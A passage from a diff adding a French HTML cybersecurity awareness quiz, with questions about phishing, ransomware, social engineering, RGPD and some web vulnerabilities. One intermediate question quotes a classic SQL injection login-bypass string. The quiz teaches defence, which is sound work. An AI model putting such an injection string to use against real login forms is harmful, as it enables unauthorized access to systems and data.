@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Quiz Cybersécurité — Jonas School</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:0 0 2rem}
+.flyer-header{width:100%;max-width:700px;background:#0C2D6B;border-radius:16px 16px 0 0;overflow:hidden}
+.flyer-top{display:flex;align-items:center;justify-content:space-between;padding:1.4rem 1.8rem 1rem;gap:16px}
+.logo-text-block .name{font-size:22px;font-weight:900;color:#fff;letter-spacing:3px;line-height:1}
+.logo-text-block .school-line{font-size:11px;color:#C9A227;letter-spacing:5px;font-weight:700;margin-top:2px}
+.logo-text-block .sub{font-size:11px;color:#aac4e8;margin-top:4px;font-style:italic}
+.logo-text-block .charte{font-size:10px;color:#C9A227;margin-top:4px;font-weight:700;font-style:italic;border-left:2px solid #C9A227;padding-left:7px;line-height:1.5}
+.badge-serie{background:#C9A227;color:#0C2D6B;font-size:10px;font-weight:900;padding:8px 14px;border-radius:8px;text-align:center;line-height:1.7;text-transform:uppercase;letter-spacing:.5px;flex-shrink:0}
+.flyer-title-bar{background:#C9A227;padding:.7rem 1.8rem;display:flex;align-items:center;justify-content:space-between}
+.flyer-title-bar .title-txt{font-size:13px;font-weight:900;color:#0C2D6B;text-transform:uppercase;letter-spacing:1px}
+.flyer-title-bar .q-count-badge{font-size:11px;background:#0C2D6B;color:#C9A227;padding:3px 10px;border-radius:20px;font-weight:700}
+.flyer-info{display:grid;grid-template-columns:1fr 1fr;border-top:2px solid #C9A227}
+.info-block{padding:.9rem 1.4rem;border-right:1px solid #1a4a8a}
+.info-block:last-child{border-right:none}
+.info-label{font-size:10px;color:#C9A227;font-weight:800;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
+.info-val{font-size:13px;color:#fff;font-weight:600;line-height:1.5}
+.flyer-contact{background:#0a2257;padding:.8rem 1.8rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
+.contact-item{font-size:12px;color:#aac4e8}
+.contact-item b{color:#C9A227}
+.series-bar{width:100%;max-width:700px;background:#fff;border-bottom:1px solid #e2e8f0;padding:.8rem 1.8rem;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.s-dot{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;flex-shrink:0}
+.s-dot.done{background:#0C2D6B;color:#C9A227}
+.s-dot.active{background:#C9A227;color:#0C2D6B}
+.s-dot.next{background:#e2e8f0;color:#aaa}
+.s-lbl{font-size:11px;color:#666;font-weight:500}
+.s-lbl.active-lbl{color:#0C2D6B;font-weight:800}
+.s-sep{color:#C9A227;font-size:13px;font-weight:700}
+.card{background:#fff;max-width:700px;width:100%;box-shadow:0 4px 24px rgba(0,0,0,.10);padding:2rem}
+.w-title{font-size:16px;font-weight:800;color:#0C2D6B;margin-bottom:.5rem}
+.w-desc{font-size:13px;color:#555;margin-bottom:1.4rem;line-height:1.7;border-left:3px solid #C9A227;padding-left:12px}
+.niv-title{font-size:12px;font-weight:800;color:#0C2D6B;margin-bottom:.8rem;text-transform:uppercase;letter-spacing:.5px}
+.niv-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:1.4rem}
+.niv-btn{padding:12px 8px;border:2px solid #e2e8f0;border-radius:10px;background:#fff;cursor:pointer;font-family:inherit;text-align:center;transition:all .15s}
+.niv-btn:hover{border-color:#0C2D6B;background:#f0f4f8}
+.niv-btn.active{border-color:#C9A227;background:#fffbf0}
+.niv-name{font-size:13px;font-weight:800;color:#0C2D6B;display:block;margin-bottom:3px}
+.niv-desc{font-size:11px;color:#888;display:block;line-height:1.4}
+.niv-count{font-size:10px;color:#C9A227;font-weight:700;display:block;margin-top:4px}
+.case-tag{display:inline-block;font-size:10px;font-weight:800;padding:2px 8px;border-radius:4px;background:#0C2D6B;color:#C9A227;text-transform:uppercase;letter-spacing:.5px;margin-bottom:.7rem}
+.progress-bg{height:5px;background:#f0f4f8;border-radius:4px;margin-bottom:1.6rem}
+.progress-fill{height:5px;border-radius:4px;transition:width .4s;background:#C9A227}
+.q-meta{display:flex;justify-content:space-between;align-items:center;margin-bottom:.5rem}
+.q-counter{font-size:12px;color:#999}
+.q-badge{font-size:11px;padding:2px 10px;border-radius:20px;font-weight:700}
+.scenario{background:#f7f9fc;border-left:3px solid #0C2D6B;padding:10px 14px;border-radius:0 8px 8px 0;font-size:13px;color:#333;line-height:1.7;margin-bottom:1rem;font-style:italic}
+.question{font-size:15px;font-weight:700;color:#0C2D6B;margin-bottom:1rem;line-height:1.65;padding-left:12px;border-left:3px solid #C9A227}
+.options{display:flex;flex-direction:column;gap:8px;margin-bottom:1rem}
+.opt{padding:11px 16px;border:1.5px solid #e2e8f0;border-radius:10px;background:#fff;font-size:14px;color:#333;cursor:pointer;text-align:left;transition:all .15s;font-family:inherit;line-height:1.4}
+.opt:hover{border-color:#0C2D6B;background:#f0f4f8}
+.opt.correct{border-color:#1D9E75;background:#E1F5EE;color:#0F6E56;font-weight:600}
+.opt.wrong{border-color:#A32D2D;background:#FCEBEB;color:#A32D2D}
+.feedback{font-size:13px;padding:10px 14px;border-radius:10px;margin-bottom:1rem;line-height:1.7}
+.feedback.ok{background:#E1F5EE;color:#0F6E56;border-left:3px solid #1D9E75}
+.feedback.ko{background:#FCEBEB;color:#A32D2D;border-left:3px solid #A32D2D}
+.btn-next{padding:10px 32px;border-radius:10px;border:none;background:#0C2D6B;color:#fff;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;transition:background .15s}
+.btn-next:hover{background:#C9A227;color:#0C2D6B}
+.btn-next:disabled{opacity:.4;cursor:not-allowed;background:#0C2D6B;color:#fff}
+.result-header{text-align:center;margin-bottom:1.4rem;padding-bottom:1.4rem;border-bottom:2px solid #f0f4f8}
+.score-big{font-size:60px;font-weight:900;color:#0C2D6B;line-height:1}
+.score-sub{font-size:14px;color:#888;margin-top:.3rem}
+.niveau-result{display:inline-block;margin-top:.8rem;font-size:14px;font-weight:800;padding:8px 28px;border-radius:6px}
+.accomp-box{border-left:4px solid #C9A227;border-radius:0 10px 10px 0;padding:1rem 1.2rem;margin:1rem 0;background:#fffbf0}
+.accomp-box.success{border-left-color:#1D9E75;background:#E1F5EE}
+.accomp-box .accomp-title{font-size:14px;font-weight:800;color:#0C2D6B;margin-bottom:.5rem}
+.accomp-box p{font-size:13px;color:#444;line-height:1.7}
+.accomp-box .contact-line{margin-top:.6rem;font-size:13px;color:#0C2D6B;font-weight:600}
+.recap{margin-top:1.4rem}
+.recap-title{font-size:12px;font-weight:800;color:#0C2D6B;margin-bottom:.8rem;text-transform:uppercase;letter-spacing:.5px;padding-bottom:.5rem;border-bottom:2px solid #f0f4f8}
+.recap-item{font-size:13px;padding:9px 0;border-bottom:1px solid #f0f4f8;display:flex;gap:10px;align-items:flex-start;color:#444;line-height:1.5}
+.recap-status{font-size:12px;font-weight:800;flex-shrink:0;margin-top:2px;padding:2px 6px;border-radius:4px}
+.recap-status.ok{background:#E1F5EE;color:#0F6E56}
+.recap-status.ko{background:#FCEBEB;color:#A32D2D}
+.btn-restart{margin-top:1.6rem;width:100%;padding:13px;border-radius:10px;border:2px solid #0C2D6B;background:#fff;color:#0C2D6B;font-size:14px;font-weight:800;cursor:pointer;font-family:inherit;transition:all .15s}
+.btn-restart:hover{background:#0C2D6B;color:#fff}
+.btn-start{width:100%;padding:14px;border-radius:10px;border:none;background:#0C2D6B;color:#fff;font-size:15px;font-weight:800;cursor:pointer;font-family:inherit;transition:background .15s}
+.btn-start:hover{background:#C9A227;color:#0C2D6B}
+.flyer-footer{width:100%;max-width:700px;background:#0C2D6B;border-radius:0 0 16px 16px;padding:.9rem 1.8rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
+.footer-left{font-size:11px;color:#aac4e8;line-height:1.6}
+.footer-left b{color:#C9A227;font-size:12px}
+.footer-right{font-size:11px;color:#aac4e8;text-align:right;line-height:1.6}
+.footer-right span{color:#fff;font-weight:700}
+.sig-block{margin-top:1.2rem;padding:1rem 1.2rem;background:#f7f9fc;border-radius:10px;border:1px solid #e2e8f0;display:flex;align-items:center;gap:14px}
+.sig-logo{width:44px;height:44px;border-radius:50%;background:#0C2D6B;display:flex;align-items:center;justify-content:center;color:#C9A227;font-weight:900;font-size:14px;flex-shrink:0}
+.sig-text{font-size:12px;color:#555;line-height:1.6}
+.sig-text b{color:#0C2D6B;font-size:13px}
+.sig-text em{color:#C9A227;font-style:italic}
+</style>
+</head>
+<body>
+<div class="flyer-header">
+  <div class="flyer-top">
+    <div style="flex-shrink:0">
+      <svg width="62" height="62" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10 48 Q32 42 54 48 L54 30 Q32 24 10 30 Z" fill="#C9A227"/>
+        <path d="M32 43 L32 27" stroke="#0C2D6B" stroke-width="1.5" stroke-dasharray="2,2"/>
+        <rect x="18" y="14" width="28" height="4" rx="1" fill="#fff"/>
+        <polygon points="32,6 10,16 54,16" fill="#fff"/>
+        <line x1="48" y1="14" x2="52" y2="20" stroke="#C9A227" stroke-width="2"/>
+        <circle cx="52" cy="21" r="2" fill="#C9A227"/>
+        <text x="32" y="38" text-anchor="middle" font-family="Georgia,serif" font-size="14" font-weight="900" fill="#fff">JS</text>
+      </svg>
+    </div>
+    <div class="logo-text-block" style="flex:1">
+      <div class="name">JONAS</div>
+      <div class="school-line">— SCHOOL —</div>
+      <div class="sub">Organisme de formation en IA</div>
+      <div class="charte">Nous formons les futurs bâtisseurs de la France de demain</div>
+    </div>
+    <div class="badge-serie">Série JS<br>Quiz #5<br>CYBER<br>SECURITE</div>
+  </div>
+  <div class="flyer-title-bar">
+    <span class="title-txt">Cybersécurité — De zéro à maîtrise · Cas réels</span>
+    <span class="q-count-badge">25 questions</span>
+  </div>
+  <div class="flyer-info">
+    <div class="info-block">
+      <div class="info-label">Thème</div>
+      <div class="info-val">Menaces réelles, protection, réseaux, mots de passe, phishing, RGPD</div>
+    </div>
+    <div class="info-block">
+      <div class="info-label">Approche</div>
+      <div class="info-val">Scénarios réels vécus par des entreprises et particuliers</div>
+    </div>
+  </div>
+  <div class="flyer-contact">
+    <span class="contact-item">108 Bvd Robert Schuman, 44300 Nantes</span>
+    <span class="contact-item"><b>contact@jonas-school.com</b></span>
+    <span class="contact-item">Mme Gautier Hayet — Ing. IA</span>
+  </div>
+</div>
+
+<div class="series-bar">
+  <span style="font-size:11px;font-weight:800;color:#0C2D6B;text-transform:uppercase;letter-spacing:.5px;margin-right:4px">Série JS</span>
+  <div class="s-dot done">1</div><span class="s-lbl">Linux</span>
+  <span class="s-sep">›</span>
+  <div class="s-dot done">2</div><span class="s-lbl">Data Analyst</span>
+  <span class="s-sep">›</span>
+  <div class="s-dot done">3</div><span class="s-lbl">Agent IA</span>
+  <span class="s-sep">›</span>
+  <div class="s-dot done">4</div><span class="s-lbl">Machine Learning</span>
+  <span class="s-sep">›</span>
+  <div class="s-dot active">5</div><span class="s-lbl active-lbl">Cybersécurité</span>
+  <span class="s-sep">›</span>
+  <div class="s-dot next">6</div><span class="s-lbl" style="color:#bbb">Prochainement</span>
+</div>
+
+<div class="card">
+  <div id="welcomeScreen">
+    <p class="w-title">Quiz Cybersécurité — Cas réels, de zéro à maîtrise</p>
+    <p class="w-desc">Chaque question est basée sur un scénario réel : attaques subies par des entreprises françaises et mondiales, erreurs humaines, failles connues. Pas de théorie abstraite — uniquement des situations concrètes que vous pourriez rencontrer demain.</p>
+    <div class="niv-title">Sélectionnez votre niveau</div>
+    <div class="niv-grid">
+      <button type="button" class="niv-btn active" data-niv="debutant" onclick="selectNiv(this)">
+        <span class="niv-name">Niveau 0</span>
+        <span class="niv-desc">Je ne connais pas la cybersécurité</span>
+        <span class="niv-count">25 questions</span>
+      </button>
+      <button type="button" class="niv-btn" data-niv="intermediaire" onclick="selectNiv(this)">
+        <span class="niv-name">Intermédiaire</span>
+        <span class="niv-desc">Je connais les bases, je veux aller plus loin</span>
+        <span class="niv-count">25 questions</span>
+      </button>
+      <button type="button" class="niv-btn" data-niv="avance" onclick="selectNiv(this)">
+        <span class="niv-name">Maîtrise</span>
+        <span class="niv-desc">Je travaille dans l'IT ou la sécurité</span>
+        <span class="niv-count">25 questions</span>
+      </button>
+    </div>
+    <div class="sig-block">
+      <div class="sig-logo">JS</div>
+      <div class="sig-text">
+        <b>Jonas School — Lancement de la formation Cybersécurité</b><br>
+        Encadrée par <b>Mme Gautier Hayet</b>, Ingénieure en IA<br>
+        <em>Nous formons les futurs bâtisseurs de la France de demain</em><br>
+        108 Bvd Robert Schuman, 44300 Nantes · contact@jonas-school.com
+      </div>
+    </div>
+    <button type="button" class="btn-start" onclick="startQuiz()" style="margin-top:1.2rem">Démarrer le test</button>
+  </div>
+  <div id="quizArea" style="display:none">
+    <div class="progress-bg"><div class="progress-fill" id="progressBar" style="width:0%"></div></div>
+    <div id="qContent"></div>
+  </div>
+</div>
+
+<div class="flyer-footer">
+  <div class="footer-left">
+    <b>JONAS SCHOOL</b> — Série Quiz JS · Quiz #5 Cybersécurité<br>
+    Nous formons les futurs bâtisseurs de la France de demain
+  </div>
+  <div class="footer-right">
+    <span>Mme Gautier Hayet</span><br>
+    Ingénieure en IA · 108 Bvd Robert Schuman, 44300 Nantes<br>
+    contact@jonas-school.com
+  </div>
+</div>
+
+<script>
+const allQ={
+debutant:[
+{scenario:"En 2016, l'hôpital de Corbeil-Essonnes a reçu des milliers d'emails semblant provenir de sa direction, demandant aux employés de cliquer sur un lien pour mettre à jour leurs identifiants.",q:"Comment s'appelle ce type d'attaque ?",opts:["Une attaque par déni de service (DDoS)","Du phishing (hameçonnage)","Un ransomware","Une attaque par force brute"],ans:1,exp:"Le <b>phishing</b> consiste à envoyer de faux emails imitant une entité de confiance pour voler des identifiants. C'est la porte d'entrée de 90% des cyberattaques."},
+{scenario:"Sophie, comptable dans une PME de Lyon, utilise le mot de passe 'sophie1985' pour tous ses comptes professionnels et personnels depuis 10 ans.",q:"Quelle est la principale erreur de Sophie ?",opts:["Elle utilise le même mot de passe partout — si un site est piraté, tous ses comptes sont compromis","Son mot de passe est trop court","Elle devrait changer son mot de passe tous les jours","Elle ne devrait pas utiliser son prénom"],ans:0,exp:"La <b>réutilisation de mot de passe</b> est l'erreur la plus fréquente. Si un seul site est piraté, tous les comptes utilisant le même mot de passe sont en danger (credential stuffing)."},
+{scenario:"En mai 2021, le réseau d'oléoduc Colonial Pipeline aux USA a été paralysé. Les attaquants ont chiffré leurs données et demandé une rançon de 4,4 millions de dollars.",q:"Quel type de logiciel malveillant a été utilisé ?",opts:["Un virus classique","Un keylogger","Un ransomware (rançongiciel)","Un adware"],ans:2,exp:"Un <b>ransomware</b> chiffre les fichiers de la victime et exige une rançon pour les déchiffrer. Colonial Pipeline a illustré l'impact économique catastrophique de ce type d'attaque."},
+{scenario:"Marc reçoit un SMS : 'Votre colis La Poste est bloqué. Payez 1,99€ de frais de douane ici : [lien]'. Il n'attendait aucun colis.",q:"Que doit faire Marc ?",opts:["Payer rapidement pour récupérer son colis","Transférer le lien à ses collègues pour les prévenir","Appeler le numéro indiqué dans le SMS","Ne pas cliquer — c'est du smishing (phishing par SMS)"],ans:3,exp:"C'est du <b>smishing</b> (SMS phishing). Il ne faut jamais cliquer sur des liens dans des SMS non sollicités. La Poste n'envoie jamais de demandes de paiement par SMS."},
+{scenario:"Une entreprise de Bordeaux constate que son site affiche '404 Not Found' depuis 3 heures. Les logs montrent des millions de requêtes provenant de pays différents simultanément.",q:"De quel type d'attaque s'agit-il ?",opts:["Une attaque DDoS (Déni de Service Distribué)","Un ransomware","Une injection SQL","Un phishing"],ans:0,exp:"Une <b>attaque DDoS</b> submerge un serveur de requêtes depuis des milliers de machines (botnet) jusqu'à le rendre inaccessible. Elle ne vole pas de données mais paralyse le service."},
+{scenario:"Léa se connecte au Wi-Fi gratuit 'CaféGratuit' dans un café parisien et consulte son compte bancaire. Un attaquant capte discrètement tout son trafic réseau.",q:"Comment s'appelle cette technique d'interception ?",opts:["Le spoofing","Le brute force","L'ingénierie sociale","Une attaque Man-in-the-Middle (MitM)"],ans:3,exp:"L'attaque <b>Man-in-the-Middle</b> intercepte les communications entre deux parties. Sur un Wi-Fi public non sécurisé, un attaquant peut lire tout le trafic non chiffré. Toujours utiliser un VPN sur les réseaux publics."},
+{scenario:"En 2017, la cyberattaque WannaCry a touché 300 000 ordinateurs dans 150 pays en exploitant une faille Windows non corrigée.",q:"Quelle est la leçon principale de cette attaque ?",opts:["Ne jamais utiliser Windows","Déconnecter ses ordinateurs d'Internet","Acheter un antivirus plus cher","Mettre à jour régulièrement ses logiciels et systèmes d'exploitation"],ans:3,exp:"WannaCry exploitait la faille <b>EternalBlue</b> de Windows, déjà corrigée par un patch 2 mois avant l'attaque. Les <b>mises à jour</b> corrigent des failles de sécurité critiques."},
+{scenario:"Thomas reçoit un appel d'un 'technicien Microsoft' qui lui dit que son ordinateur envoie des virus et qu'il doit installer un logiciel de réparation à distance.",q:"Quelle est la bonne réaction ?",opts:["Installer le logiciel rapidement avant que le problème s'aggrave","Donner accès à l'ordinateur mais surveiller ce qu'il fait","Raccrocher immédiatement — c'est une arnaque au faux support technique","Demander le numéro de badge du technicien"],ans:2,exp:"C'est l'<b>arnaque au faux support technique</b> (vishing). Microsoft ne contacte jamais spontanément les utilisateurs par téléphone. L'objectif est d'installer un logiciel malveillant ou de voler des informations bancaires."},
+{scenario:"Une entreprise nantaise découvre que 50 000 données clients (noms, emails, téléphones) ont été volées suite à une faille sur leur site e-commerce.",q:"Quelle obligation légale s'impose selon le RGPD ?",opts:["Garder l'incident confidentiel pour éviter la panique","Fermer le site web pendant 30 jours","Payer une amende immédiatement","Notifier la CNIL et les personnes concernées dans les 72 heures"],ans:3,exp:"Le <b>RGPD</b> impose de notifier la CNIL dans les <b>72 heures</b> et d'informer les personnes concernées si le risque est élevé. Le non-respect peut entraîner une amende jusqu'à 4% du CA mondial."},
+{scenario:"Paul utilise le code PIN '1234' sur son smartphone contenant ses emails professionnels, photos et application bancaire.",q:"Quelle mesure de sécurité Paul devrait-il adopter en priorité ?",opts:["Utiliser un code PIN complexe ou la biométrie (empreinte/visage)","Mettre un fond d'écran personnalisé","Changer de marque de téléphone","Désactiver le Wi-Fi quand il ne l'utilise pas"],ans:0,exp:"Un <b>code PIN faible comme '1234'</b> peut être deviné en quelques secondes. Un attaquant ayant accès physique au téléphone accède à toutes les données. Utiliser un code à 6 chiffres minimum ou la biométrie."},
+{scenario:"Une directrice RH reçoit un email de son PDG (email identique à l'habituel) lui demandant de virer 50 000€ d'urgence pour 'finaliser un contrat confidentiel'.",q:"De quelle arnaque s'agit-il ?",opts:["Un ransomware","Une attaque DDoS","Une fraude au président (BEC — Business Email Compromise)","Un keylogger"],ans:2,exp:"La <b>fraude au président</b> coûte des milliards chaque année. L'attaquant usurpe l'identité d'un dirigeant pour déclencher un virement urgent. Règle : tout virement inhabituel doit être confirmé par téléphone."},
+{scenario:"Julien télécharge une application 'Lampe de poche' gratuite sur Android. L'application demande l'accès aux contacts, au microphone et à la localisation.",q:"Quelle est la bonne attitude ?",opts:["Désinstaller le téléphone","Signaler uniquement si l'application est payante","Accepter toutes les permissions, c'est normal pour une lampe de poche","Refuser les permissions inutiles — une lampe de poche n'a besoin d'aucune de ces données"],ans:3,exp:"Les <b>permissions excessives</b> sont un signal d'alarme. Une lampe de poche n'a besoin d'aucune permission réseau, contacts ou microphone. Certaines applications collectent et revendent vos données."},
+{scenario:"Le réseau d'une école primaire de Paris a été infecté par un malware propagé via une clé USB oubliée dans le couloir.",q:"Comment s'appelle ce vecteur d'attaque physique ?",opts:["Un shoulder surfing","Un dumpster diving","Un cold boot attack","Un baiting (appât physique)"],ans:3,exp:"Le <b>baiting</b> consiste à laisser volontairement un support infecté (clé USB) dans un endroit où une victime curieuse va le brancher. Règle : ne jamais brancher une clé USB inconnue."},
+{scenario:"Une startup reçoit un email d'un partenaire habituel avec une facture PDF. En l'ouvrant, un code malveillant s'exécute et chiffre tout le réseau.",q:"Quel mécanisme a permis cela ?",opts:["Le PDF était trop lourd pour le serveur","Une vulnérabilité dans le PDF exploitant une faille du lecteur ou des macros malveillantes","Le partenaire avait un antivirus obsolète","La startup utilisait une version gratuite d'Outlook"],ans:1,exp:"Les <b>PDF et documents Office malveillants</b> peuvent contenir des macros ou exploiter des failles du lecteur. Il faut ouvrir les pièces jointes dans un environnement sandbox et désactiver les macros automatiques."},
+{scenario:"Sophie voit la barre d'adresse afficher 'http://' au lieu de 'https://' sur le site de sa banque.",q:"Que signifie l'absence du 'S' dans HTTPS ?",opts:["Le site est plus rapide en HTTP","Il faut actualiser la page pour obtenir HTTPS","Le site est hébergé à l'étranger","La communication n'est pas chiffrée — les données peuvent être interceptées"],ans:3,exp:"<b>HTTPS</b> chiffre la communication via TLS. En <b>HTTP simple</b>, toutes les données (identifiants, coordonnées bancaires) transitent en clair. Ne jamais saisir de données sensibles sur un site HTTP."},
+{scenario:"Ahmed reçoit un email l'informant qu'il a gagné un iPhone. L'expéditeur est 'Apple-Concours@gmail.com'.",q:"Quel premier indice indique que c'est une arnaque ?",opts:["Apple envoie toujours ses emails depuis @gmail.com","Les concours Apple sont toujours légaux","L'adresse email utilise Gmail au lieu d'un domaine officiel @apple.com","Il aurait dû recevoir le prix par courrier"],ans:2,exp:"Le <b>domaine de l'expéditeur</b> est le premier indice. Apple utilise son propre domaine (@apple.com). Un email officiel ne viendra jamais d'un compte Gmail ou Hotmail."},
+{scenario:"Un collaborateur d'une banque française note son mot de passe sur un post-it collé sur son écran dans un open space.",q:"Quel risque de sécurité cela représente-t-il ?",opts:["Aucun risque si les visiteurs signent un NDA","Uniquement un risque si la fenêtre est ouverte","Un risque acceptable dans un environnement professionnel sécurisé","Un risque majeur d'accès non autorisé par n'importe quelle personne passant dans le bureau"],ans:3,exp:"Le <b>shoulder surfing</b> et les post-its sont des menaces réelles de sécurité physique. Utiliser un gestionnaire de mots de passe (Bitwarden, 1Password) pour éviter de les noter."},
+{scenario:"La ville de Baltimore a subi en 2019 une attaque informatique qui a paralysé ses services municipaux pendant 5 semaines, coûtant 18 millions de dollars.",q:"Quelle mesure préventive aurait limité les dégâts ?",opts:["Utiliser uniquement des ordinateurs Apple","Débrancher tous les ordinateurs la nuit","Embaucher plus d'informaticiens","Avoir des sauvegardes régulières et isolées (backups offline)"],ans:3,exp:"Des <b>sauvegardes régulières et isolées du réseau</b> (règle 3-2-1) permettent de restaurer les systèmes sans payer de rançon. Baltimore n'avait pas de plan de sauvegarde robuste."},
+{scenario:"Une développeuse publie accidentellement son code sur GitHub avec ses clés API et mots de passe en clair dans le fichier.",q:"Quel est le risque immédiat ?",opts:["Aucun risque si le dépôt est privé","GitHub chiffre automatiquement les secrets","Le risque existe uniquement si quelqu'un cherche spécifiquement son code","Des bots scannent GitHub en permanence et peuvent exploiter ces clés en quelques minutes, même après suppression"],ans:3,exp:"Des <b>bots automatisés</b> scannent GitHub en temps réel. Même supprimés, les secrets sont indexés. Utiliser des variables d'environnement et révoquer immédiatement toute clé exposée."},
+{scenario:"Un employé reçoit un message Teams d'un 'collègue IT' lui demandant son identifiant et mot de passe pour 'dépanner une urgence serveur'.",q:"Quelle est la bonne réaction ?",opts:["Donner les informations car c'est une urgence","Envoyer uniquement l'identifiant sans le mot de passe","Demander d'abord si le collègue est dans l'open space","Refuser catégoriquement — un vrai service IT ne demande jamais un mot de passe"],ans:3,exp:"C'est de l'<b>ingénierie sociale</b>. Aucun service informatique légitime ne demande jamais un mot de passe. C'est une règle universelle en cybersécurité."},
+{scenario:"Clara active le 2FA sur son compte email. Quelques jours après, elle reçoit un SMS avec un code alors qu'elle ne s'est pas connectée.",q:"Que doit-elle faire immédiatement ?",opts:["Ignorer le SMS, c'est probablement une erreur","Désactiver le 2FA car il crée des alertes inutiles","Attendre de voir si ça recommence","Changer son mot de passe immédiatement — quelqu'un tente de se connecter à son compte"],ans:3,exp:"Un code 2FA reçu sans avoir initié de connexion signifie que <b>quelqu'un connaît son mot de passe</b>. Le 2FA a bloqué l'intrusion, mais le mot de passe est compromis et doit être changé immédiatement."},
+{scenario:"Une PME de Rennes a configuré son routeur Wi-Fi en gardant le mot de passe d'administration par défaut 'admin/admin'.",q:"Quel risque critique cela représente-t-il ?",opts:["Aucun risque si le Wi-Fi est protégé par WPA2","C'est uniquement dangereux sur les réseaux publics","Le risque est limité au seul routeur","Un attaquant peut prendre le contrôle total du routeur et intercepter tout le trafic réseau"],ans:3,exp:"Les <b>identifiants par défaut</b> sont publiquement connus. Prendre le contrôle du routeur permet d'intercepter tout le trafic et d'accéder à tous les appareils du réseau. Changer immédiatement les identifiants par défaut."},
+{scenario:"Romain reçoit un email urgent de sa banque BNP Paribas via le lien 'bnp-paribas-secure-verification.com'.",q:"Comment détecter que ce lien est frauduleux ?",opts:["L'email est urgent donc c'est probablement légitime","BNP Paribas n'envoie jamais d'emails","Le lien est suspect uniquement s'il commence par 'http'","Le vrai domaine est 'bnpparibas.fr' — tout autre domaine est suspect"],ans:3,exp:"Le <b>typosquatting</b> crée de faux domaines ressemblant à l'original. Toujours accéder à sa banque en tapant l'URL directement dans le navigateur, jamais via un lien email."},
+{scenario:"Suite à une attaque, une entreprise parisienne découvre que l'attaquant était présent dans son réseau depuis 8 mois sans que personne ne s'en aperçoive.",q:"Comment s'appelle cette technique d'attaque discrète ?",opts:["Un APT (Advanced Persistent Threat)","Un ransomware standard","Une attaque DDoS lente","Un phishing de longue durée"],ans:0,exp:"Un <b>APT (Advanced Persistent Threat)</b> est une attaque sophistiquée et discrète où l'attaquant s'infiltre et reste dans le réseau pendant des mois pour collecter des données ou préparer une frappe."},
+{scenario:"Un adolescent de 17 ans a piraté Twitter en 2020, publiant des tweets depuis les comptes de Barack Obama et Elon Musk pour une arnaque au Bitcoin.",q:"Quelle technique a-t-il principalement utilisée ?",opts:["Il a cassé les mots de passe par force brute","Il a exploité une faille du code source de Twitter","Il a utilisé un logiciel de hacking du dark web","Il a manipulé des employés Twitter par téléphone pour obtenir les accès internes (ingénierie sociale)"],ans:3,exp:"Le hack Twitter 2020 repose sur de l'<b>ingénierie sociale téléphonique</b>. L'attaquant s'est fait passer pour un technicien IT interne. L'humain reste le maillon le plus faible de la sécurité."},
+],
+intermediaire:[
+{scenario:"Un analyste SOC remarque dans les logs une connexion SSH depuis une IP en Roumanie sur un serveur de production. L'employé concerné est en vacances en France.",q:"Quelle réponse incidente doit-il déclencher en priorité ?",opts:["Envoyer un email à l'employé pour confirmation","Isoler immédiatement le serveur du réseau et lancer l'investigation forensique","Réinitialiser le mot de passe et surveiller","Bloquer uniquement l'IP roumaine dans le firewall"],ans:1,exp:"Le principe du <b>containment first</b> : isoler le système compromis pour stopper la propagation latérale. Bloquer l'IP seule ne sert à rien (l'attaquant peut en changer)."},
+{scenario:"Un pentest révèle que l'API renvoie les données de tous les utilisateurs quand on modifie l'ID dans la requête GET /api/users/123 → /api/users/124.",q:"De quelle vulnérabilité OWASP s'agit-il ?",opts:["SQL Injection","Cross-Site Scripting (XSS)","Broken Object Level Authorization (BOLA/IDOR)","Security Misconfiguration"],ans:2,exp:"C'est un <b>IDOR (Insecure Direct Object Reference)</b>, classé BOLA dans OWASP API Top 10. L'API ne vérifie pas que l'utilisateur est autorisé à accéder à l'objet demandé."},
+{scenario:"Lors d'un audit, un administrateur découvre que tous les serveurs communiquent sans restriction sur le réseau interne. Une machine infectée peut atteindre n'importe quel serveur.",q:"Quel principe de sécurité réseau n'a pas été appliqué ?",opts:["Le chiffrement TLS inter-serveurs","L'installation d'antivirus sur les serveurs","L'utilisation d'IPv6","La segmentation réseau et le principe de moindre privilège (Zero Trust)"],ans:3,exp:"La <b>segmentation réseau</b> divise le réseau en zones isolées. Le modèle <b>Zero Trust</b> vérifie chaque communication. Cela limite le mouvement latéral d'un attaquant."},
+{scenario:"Un développeur constate que son application web renvoie en production : 'SQL error: Table users doesn't exist in database prod_db at line 42'.",q:"Pourquoi cette information est-elle dangereuse ?",opts:["Elle ralentit l'application","Elle viole le RGPD car elle contient des données personnelles","Elle consomme trop de bande passante","Elle révèle la structure interne de la base de données, aidant un attaquant à cibler ses injections SQL"],ans:3,exp:"Le <b>verbose error disclosure</b> fournit des informations précieuses à un attaquant. En production, les erreurs doivent afficher un message générique et logger les détails côté serveur uniquement."},
+{scenario:"Un test d'intrusion montre que le formulaire de connexion accepte le login: ' OR '1'='1' -- et donne accès sans mot de passe.",q:"Comment se nomme cette vulnérabilité et quelle est la correction ?",opts:["XSS — utiliser Content Security Policy","CSRF — ajouter un token CSRF","Buffer overflow — valider la longueur des inputs","SQL Injection — utiliser des requêtes préparées (prepared statements)"],ans:3,exp:"L'<b>injection SQL</b> est en tête de l'OWASP Top 10. La correction : utiliser des <b>requêtes préparées</b> (parameterized queries) qui séparent les données du code SQL."},
